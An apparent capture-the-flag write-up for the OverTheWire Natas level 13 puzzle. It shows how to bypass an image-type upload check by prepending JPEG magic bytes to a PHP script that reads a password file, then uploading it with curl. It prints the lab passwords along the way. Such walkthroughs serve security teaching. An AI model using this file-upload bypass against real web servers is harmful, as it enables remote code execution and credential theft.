This seems to be the same as natas12 but now:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
	echo "File is not an image";
}
```
It only accepts image files using `exif_imagetype()`.

Let's learn how this function works so that we can bypass it.

From the official php documentation:
```txt
exif_imagetype() reads the first bytes of an image and checks its signature
```

So all we have to do to bypass this function is to add in the first bytes of a jpg file. The magic bytes for jpg is `FF D8 FF EE` (according to [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures))

```sh
$ echo -e "\xFF\xD8\xFF\xEE" > test.php
$ file test.php
test.php: JPEG image data
```

now that `test.php` is recognized as a jpg file, let's load it up with some script:

```sh
echo -n '<?php $password = file_get_contents("/etc/natas_webpass/natas14"); echo $password; ?>' >> test.php
```

Putting this through the same curl command as natas12...
```sh
curl -u natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 -F "filename=test.php" -F "uploadedfile=@./test.php" http://natas13.natas.labs.overthewire.org
```

... we get:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>
The file <a href="upload/r9zzwz9ucm.php">upload/r9zzwz9ucm.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Now, if we go to `upload/r9zzwz9ucm.php`, we get:
```
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
```